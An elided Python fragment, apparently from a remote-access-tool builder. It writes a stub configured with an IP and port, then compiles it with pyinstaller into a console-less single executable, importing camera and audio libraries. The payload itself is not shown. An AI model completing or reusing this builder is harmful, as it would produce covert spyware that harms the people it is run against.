...
try:
    os.makedirs(os.path.join(cartella , "Stubs"))
...
def Build(IP , PORT):
    ...
    if IP and PORT and isthere:
        ...
        with open(os.path.join(cartella , "temporary.py") , "w" , encoding="utf-8") as temp:
            ...
            temp.close()
        subprocess.call(rf'pyinstaller "{os.path.join(cartella , "temporary.py")}" --distpath {os.path.join(cartella , "Stubs")} --noconsole --onefile --hidden-import colorama --hidden-import opencv-python --hidden-import numpy --hidden-import matplotlib --hidden-import pyaudio')
        os.remove(os.path.join(cartella , "temporary.py"))
        os.startfile(os.path.join(cartella , "Stubs"))
